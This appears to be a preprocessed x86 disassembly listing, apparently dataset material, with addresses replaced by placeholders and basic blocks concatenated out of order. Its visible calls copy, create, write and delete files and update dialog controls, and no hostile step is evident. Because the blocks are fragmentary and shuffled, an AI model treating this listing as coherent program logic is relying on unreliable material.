mov [ ebp - 0x28 ] esi
mov [ ebp + 0x8 ] 0x1
jmp r-xdata
inc [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ ecx + edx * 4 + 0x4 ]
sub eax [ ecx + edx * 4 ]
jmp r-xdata
mov edx [ ebp - 0x14 ]
lea esi [ edx + 0x1 ]
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
lea ecx [ ebp + 0x8 ]
add esi eax
push ecx
push esi
call sub_402850
add esp 0x10
mov eax [ ebp - 0x5c ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x64 ]
push 0x0
cmp eax edi
mov eax [ ebp - 0x78 ]
push 0x0
jae r-xdata
lea eax [ ebp - 0x40 ]
lea esi [ ebx + 0x14 ]
mov esi [ ebx + 0x14 ]
jmp r-xdata
mov edx [ ebp - 0x98 ]
mov ecx [ eax + esi + 0x50 ]
push edx
mov edx [ eax + esi + 0x4c ]
mov eax [ ebp - 0x14 ]
push ecx
push edx
push eax
call [ LocalSize@IAT ]
mov ecx [ ebp - 0x14 ]
push eax
push ecx
push ebx
call sub_405e70
add esp 0x18
mov [ ebp + 0x8 ] eax
push 0x0
add eax 0x4
push ecx
push eax
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push ecx
push eax
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
push ecx
cmp [ eax + 0x18 ] edi
push 0x0
push 0x0
jb r-xdata
lea ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x84 ]
inc eax
mov [ ebp + 0x8 ] 0x1
mov [ ebp - 0x84 ] eax
jmp r-xdata
push eax
call [ LocalFree@IAT ]
jmp r-xdata
push eax
mov eax [ rw-data ]
mov edx [ eax + esi + 0x2c ]
mov eax [ eax + esi + 0x28 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
cmp [ ebp - 0x64 ] edi
mov eax [ ebp - 0x78 ]
jae r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
push ebx
push sub_447d90
push ecx
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
jae r-xdata
push 0x0
push eax
push ecx
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + esi + 0x2c ]
mov eax [ eax + esi + 0x28 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
mov eax [ ebp + 0x8 ]
test eax eax
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xc
je r-xdata
mov [ ecx ] eax
call sub_406750
add esp 0x24
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x374 ]
push ecx
mov ecx [ ebp - 0x54 ]
push sub_447d90
push eax
mov eax [ ebp - 0x48 ]
push edx
mov edx [ ebp - 0x388 ]
push eax
push ecx
push edx
lea eax [ ebp - 0x7b4 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
test ecx ecx
mov [ ebp - 0x4 ] 0xf
je r-xdata
mov edx [ ecx ]
push 0x2
lea eax [ ebp - 0x58 ]
push eax
call [ edx + 0x18 ]
cmp [ ebp - 0x58 ] 0xd8ff
jne r-xdata
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
push 0x1
push ecx
push ecx
push ecx
push ecx
push eax
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x78 ]
push edi
call [ LocalFree@IAT ]
jmp r-xdata
mov edx [ ebp - 0x94 ]
mov ecx [ eax + 0x50 ]
push edx
mov edx [ eax + 0x4c ]
push ecx
push edx
push edi
call [ LocalSize@IAT ]
push eax
push edi
push esi
call sub_405e70
add esp 0x18
test edi edi
mov [ ebp + 0x8 ] eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push eax
push ecx
call [ LocalSize@IAT ]
mov edx [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push edx
push 0x0
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x40 ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov eax [ rw-data ]
mov ecx [ eax + esi + 0x2c ]
push ecx
mov ecx [ eax + esi + 0x28 ]
push ecx
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push 0x0
push 0x0
push ecx
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x40 ]
test esi esi
mov [ ebp - 0x4 ] 0xb
je r-xdata
test esi esi
push 0x0
push 0x1
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov edi [ ebp - 0x18 ]
mov esi [ ecx + 0x4 ]
lea eax [ ecx + 0x4 ]
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push 0x2
lea eax [ ebp - 0x58 ]
push eax
call [ edx + 0x18 ]
cmp [ ebp - 0x58 ] 0xe1ff
jne r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + esi + 0x20 ]
push 0x1
push 0x0
push edx
push 0x0
push eax
push 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
inc [ eax + 0x4 ]
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
inc [ eax + 0x4 ]
mov edx [ ebp - 0x4c ]
push 0x0
lea ecx [ ebp - 0x10c ]
push ecx
push edx
call [ LocalSize@IAT ]
push eax
mov eax [ ebp - 0x4c ]
push eax
push esi
call [ WriteFile@IAT ]
push esi
mov [ ebp + 0x8 ] eax
call [ CloseHandle@IAT ]
jmp r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ eax + esi + 0x20 ]
push ecx
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push edx
push 0x0
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea ecx [ ebp - 0x40 ]
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
lea ecx [ ebp - 0x7b4 ]
mov [ ebp - 0x4 ] 0xa
call sub_43a1f0
mov eax [ edi + 0x8 ]
dec eax
mov [ ebp - 0x4 ] 0x9
mov [ edi + 0x8 ] eax
jne r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov [ eax ] esi
call sub_4065a0
add esp 0xc
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
inc [ esi + 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] 0x0
mov edx [ ecx ]
push eax
call [ edx + 0x18 ]
mov eax [ ebp - 0x58 ]
test ax ax
jbe r-xdata
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp + 0x8 ]
call sub_401020
jmp r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
jmp r-xdata
test esi esi
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x374 ]
mov eax [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0x54 ]
push sub_447d90
push 0x0
push edx
mov edx [ ebp - 0x388 ]
push eax
push ecx
push edx
lea eax [ ebp - 0x7b4 ]
push eax
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
movzx eax ax
xor ecx ecx
mov ch al
shr eax 0x8
or ecx eax
sub ecx 0x2
mov esi ecx
push esi
mov [ ebp - 0x28 ] esi
call sub_4b66db
mov ebx eax
add esp 0x4
test ebx ebx
mov [ ebp - 0x54 ] ebx
je r-xdata
mov [ eax ] esi
call sub_406750
add esp 0x24
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
inc [ esi + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push esi
push ebx
call [ edx + 0x18 ]
test esi esi
push ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov [ eax ] esi
call sub_406690
add esp 0x4
mov [ ebp + 0x8 ] eax
inc [ esi + 0x4 ]
sub_44b4da
mov ebx [ ebp - 0x54 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push ecx
push ebx
push 0x0
push edx
push sub_447d90
xor ecx ecx
mov cl [ rw-data ]
push 0x0
xor edx edx
mov dl [ rw-data ]
push 0x0
push ecx
mov ecx [ ebp - 0x48 ]
push edx
push 0x0
push ecx
mov ecx [ ebp - 0x18 ]
push eax
call sub_43d820
test ebx ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x78 ]
mov al [ rw-data ]
test al al
je r-xdata
push ebx
call sub_4b66ed
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
mov [ ebp - 0x4 ] 0x6
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi eax
dec [ esi + 0xd48 ]
jne r-xdata
mov eax [ ebp - 0x2c ]
mov edi 0x10
cmp eax edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov edi 0x10
mov eax [ ebp - 0x84 ]
inc eax
mov edi 0x10
mov [ ebp - 0x84 ] eax
jmp r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov esi [ ebp - 0x24 ]
mov edx [ esi + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
lea eax [ ebp - 0x11c ]
push eax
call [ GetLocalTime@IAT ]
lea ecx [ ebp - 0x100 ]
push ecx
lea edx [ ebp - 0x11c ]
push edx
call [ SystemTimeToFileTime@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push sub_447d90
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
push ecx
jae r-xdata
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x64 ] edi
mov esi 0xf
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov ecx [ ebp - 0x40 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ ebp - 0x2c ] edi
jb r-xdata
mov edx [ ebp - 0xfc ]
push eax
mov eax [ ebp - 0x100 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
mov eax [ ebp - 0x50 ]
mov ebx [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x64 ] esi
mov esi [ ebp - 0x60 ]
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov edx [ ebp - 0x78 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push eax
mov eax [ ebp - 0x64 ]
push 0x0
cmp eax edi
mov eax [ ebp - 0x78 ]
push 0x0
jae r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x50 ]
cmp eax esi
mov edi [ SetDlgItemTextA@IAT ]
jge r-xdata
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x78 ]
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov esi eax
mov al [ ebx + 0x8 ]
shl esi 0x5
test al al
mov edx [ ecx + esi + 0x1c ]
mov [ ebp - 0x14 ] edx
je r-xdata
mov [ ecx ] eax
call sub_4060a0
add esp 0x30
mov [ ebp + 0x8 ] eax
inc [ eax + 0x4 ]
mov al [ rw-data ]
test al al
je r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ ebx + 0x4 ]
add esp 0xc
lea edx [ ebp - 0x324 ]
push edx
push 0xdce
push eax
call edi
mov ecx [ ebp - 0x80 ]
push ecx
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
lea eax [ ebp - 0x324 ]
push eax
push 0xdd5
push ecx
call edi
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x50 ]
push edx
inc eax
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ ebx + 0x4 ]
add esp 0x10
lea edx [ ebp - 0x324 ]
push edx
push 0xdcf
push eax
call edi
mov ecx [ ebp - 0x50 ]
mov edx [ ebx + 0x4 ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push ecx
push 0x402
push 0xdd1
push edx
call edi
mov eax [ ebx + 0x4 ]
push 0x0
push 0x0
push 0x402
push 0xdd2
push eax
call edi
xor ecx ecx
mov eax 0xf
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x78 ] cl
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x40 ] cl
mov edx [ rw-data ]
push 0xffffffff
push ecx
lea eax [ edx + esi ]
push eax
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x18 ] 0x1
call sub_401dd0
mov al [ rw-data ]
test al al
je r-xdata
mov [ ebp - 0x1c ] 0x1
mov al [ rw-data ]
test al al
je r-xdata
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp + 0x8 ] esp
mov eax esp
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi 0x10
nop
mov esi [ rw-data ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
dec ecx
push ecx
call sub_46fbb0
mov eax [ ebp - 0xd8 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
call sub_406690
jmp r-xdata
inc [ ecx + 0x4 ]
mov [ eax ] ecx
call sub_405fe0
jmp r-xdata
inc [ ecx + 0x4 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2c ]
mov esi [ rw-data ]
xor ebx ebx
cmp eax edi
mov eax [ ebp - 0x40 ]
mov [ rw-data ] ebx
jae r-xdata
mov eax [ ebp - 0x50 ]
mov ebx [ rw-data ]
push 0xffffffff
shl eax 0x5
add eax ebx
push 0x0
push eax
lea ecx [ ebp - 0x44 ]
call sub_401dd0
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax + 0x4 ]
push 0x0
push edx
push 0x1802
push ecx
call [ PostMessageA@IAT ]
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp - 0x4 ] 0x1
je r-xdata
cmp [ ebp - 0xd4 ] 0x10
mov eax [ ebp - 0xe8 ]
jae r-xdata
mov esi [ ebp - 0x24 ]
mov edi 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp + 0x8 ] edx
je r-xdata
push eax
call sub_439280
add esp 0x4
cmp eax 0x7
mov [ ebp - 0x48 ] eax
mov [ rw-data ] esi
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_458010
mov ecx [ ebp - 0x40 ]
mov esi eax
mov eax [ ebp - 0x2c ]
add esp 0x4
cmp eax edi
jae r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
imul eax eax 0x70
mov ecx [ eax + esi + 0x38 ]
add eax esi
cmp ecx 0xffffffff
jne r-xdata
cmp [ ebp - 0xd4 ] 0x10
jb r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0xe8 ]
add esi 0x14
mov esi [ esi + 0x14 ]
jmp r-xdata
mov ecx [ eax + 0x248 ]
mov edi 0x10
cmp ecx edi
jb r-xdata
mov [ ebp - 0x1c ] 0xfffffffa
jmp r-xdata
mov eax [ edi + 0x12c ]
test eax eax
mov ebx 0x10
jne r-xdata
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
jae r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp - 0x48 ] ecx
mov cl [ rw-data ]
test cl cl
jne r-xdata
add ecx esi
mov eax ecx
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
lea ebx [ eax + 0x1 ]
lea ebx [ ebx ]
lea ecx [ ebp - 0x40 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x8c ]
mov [ ebp - 0xd4 ] 0xf
mov [ ebp - 0xd8 ] 0x0
mov [ ebp - 0xe8 ] 0x0
mov ecx [ eax ]
push eax
push ecx
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_448f60
mov edx [ ebp - 0x8c ]
push edx
call j_sub_4b66ed#2
mov ecx [ ebp - 0xc ]
add esp 0x4
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xe8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ ecx ]
push 0x1
call [ edx ]
push esi
call sub_405e40
add eax 0x234
mov eax [ eax + 0x234 ]
jmp r-xdata
cmp [ edi + 0x130 ] ebx
jb r-xdata
mov [ ebp + 0x8 ] 0xffffffff
jmp r-xdata
mov eax ecx
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0xb0 ] 0x0
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
lea ecx [ ebp - 0x40 ]
mov edx [ eax * 4 + rw-data ]
mov eax edx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebx
push eax
push ecx
lea ecx [ ebp - 0xd0 ]
call sub_401e80
mov eax [ ebp - 0x30 ]
cmp esi eax
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x44 ]
ja r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ ebp - 0x44 ]
call sub_401cc0
lea ecx [ esi + 0x14 ]
push eax
push ecx
call sub_405ef0
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0x14 ]
push eax
push ecx
call sub_405ef0
add esp 0x8
jmp r-xdata
mov esi [ ebp - 0x24 ]
cmp [ esi + 0x28 ] edi
jb r-xdata
add edi 0x11c
mov edi [ edi + 0x11c ]
jmp r-xdata
mov eax [ edi + 0x2ec ]
test eax eax
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0xb4 ]
call sub_401e80
lea edx [ ebp - 0xb4 ]
push edx
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x8
call sub_448ca0
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
cmp [ ebp - 0x9c ] edi
mov [ ebp - 0xf8 ] ecx
mov [ ebp - 0x4 ] 0x6
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ ebp - 0x44 ]
call sub_401cc0
push 0x0
sub esi eax
push esi
call sub_4017f0
push 0xffffffff
push esi
call sub_401ba0
jmp r-xdata
cmp [ esi + 0x28 ] edi
jb r-xdata
cmp [ edi + 0x2f0 ] ebx
jb r-xdata
or esi 0xffffffff
jmp r-xdata
push edi
call j_sub_4b692d
mov edi [ rw-data ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0x18 ]
inc ecx
test bl bl
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0x18 ] ecx
je r-xdata
mov edx [ ebp - 0xb0 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x324 ]
push eax
lea ecx [ ebp - 0x44 ]
call sub_401cc0
push 0xffffffff
push 0x0
lea ecx [ ebp - 0xd0 ]
push ecx
lea ecx [ ebp - 0x44 ]
call sub_4018c0
cmp [ ebp - 0xb8 ] edi
mov [ ebp - 0x4 ] 0x6
jb r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x324 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
add edi 0x2dc
mov edi [ edi + 0x2dc ]
jmp r-xdata
cmp [ edi + 0x360 ] ebx
jb r-xdata
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
mov edx [ ebp - 0xcc ]
push edx
call j_sub_4b66ed#2
add esp 0x4
add edi 0x34c
mov edi [ edi + 0x34c ]
jmp r-xdata
push edi
call j_sub_4b692d
mov edi [ rw-data ]
add esp 0x4
mov esi eax
push 0xffffffff
push 0x0
lea ecx [ ebp - 0xec ]
push ecx
lea ecx [ ebp - 0x7c ]
call sub_401dd0
mov al [ rw-data ]
test al al
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0xd0 ]
call sub_401e80
mov eax [ rw-data ]
cmp [ eax + 0x37c ] 0x10
mov [ ebp - 0x4 ] 0x12
jb r-xdata
mov ebx 0xf
mov eax edi
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x1 ]
cmp [ ebp - 0x2c ] 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
mov eax rw-data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
lea ecx [ eax + 0x368 ]
mov ecx [ eax + 0x368 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edi [ ebp - 0x24 ]
mov edx [ edi + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov esi [ rw-data ]
xor eax eax
lea esp [ esp ]
lea eax [ ebp - 0x40 ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea ecx [ ebp - 0x7c ]
call sub_401e80
push 0x5c
push 0x1
lea ecx [ ebp - 0x7c ]
call sub_4017f0
push 0xffffffff
push 0x0
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x7c ]
call sub_4018c0
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
lea ecx [ ebp - 0xb4 ]
call sub_401e80
mov ecx [ rw-data ]
mov eax r--data
mov [ ebp - 0x4 ] 0x13
add ecx 0x348
lea edi [ eax + 0x1 ]
mov eax ecx
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
lea edi [ eax + 0x1 ]
mov ecx ebx
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
mov edx [ ecx + esi + 0x38 ]
cmp edx 0xffffffff
lea eax [ ecx + esi ]
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push r--data
call sub_401e80
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
add ecx 0x364
push rw-data
call sub_401dd0
mov eax [ rw-data ]
xor edi edi
test eax eax
jle r-xdata
xor esi esi
cmp edx esi
jne r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ esi + eax * 4 ] ecx
je r-xdata
cmp eax ecx
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ebx 0x1
push ebx
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
push eax
mov [ ebp + 0x8 ] 0x0
call sub_4af910
mov edi eax
mov eax [ rw-data ]
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
add eax esi
push edx
push eax
call sub_4adff0
add esp 0x1c
test edi edi
jne r-xdata
mov ecx [ rw-data ]
push ecx
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp - 0xf4 ] esp
mov eax esp
je r-xdata
lea ecx [ ecx ]
sub ebx edx
sar ebx 0x2
mov ecx ebx
xor ecx ecx
jmp r-xdata
inc eax
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp edi ebx
mov ecx [ rw-data ]
jne r-xdata
push 0xa
call [ Sleep@IAT ]
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x8 ]
test cl cl
mov ecx [ rw-data ]
jne r-xdata
mov [ eax ] ecx
call sub_406260
add esp 0x8
test eax eax
jne r-xdata
inc [ ecx + 0x4 ]
mov ecx [ rw-data ]
mov edx [ ebx + ecx + 0x48 ]
inc edx
cmp esi edx
jne r-xdata
mov ecx [ rw-data ]
lea eax [ edi + 0x1 ]
push eax
add ecx 0x118
call sub_421150
mov ebx [ edx + eax * 4 ]
cmp ebx esi
mov [ ebp - 0x18 ] ebx
je r-xdata
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0x14 ]
push esi
push esi
push edx
push eax
call sub_4706c0
add esp 0x10
cmp eax esi
jge r-xdata
cmp eax ecx
jl r-xdata
test edx edx
jne r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
cmp [ ecx + esi + 0x38 ] 0xffffffff
je r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov [ ebp - 0x1c ] ebx
push ebx
lea eax [ ecx + esi ]
lea edx [ ebp - 0x5c ]
push edx
lea ecx [ ebp - 0x4c ]
push ecx
push eax
call sub_4af910
mov edx [ rw-data ]
mov edi eax
lea eax [ edx + esi ]
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
push eax
call sub_4adff0
add esp 0x1c
test edi edi
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ rw-data ]
push edx
add ecx 0x118
call sub_421150
mov ecx [ rw-data ]
push esi
add ecx 0x2d8
call sub_421150
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0xd0 ]
add ecx 0x348
push eax
call sub_401dd0
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
lea edx [ ebp - 0xb4 ]
add ecx 0x364
push edx
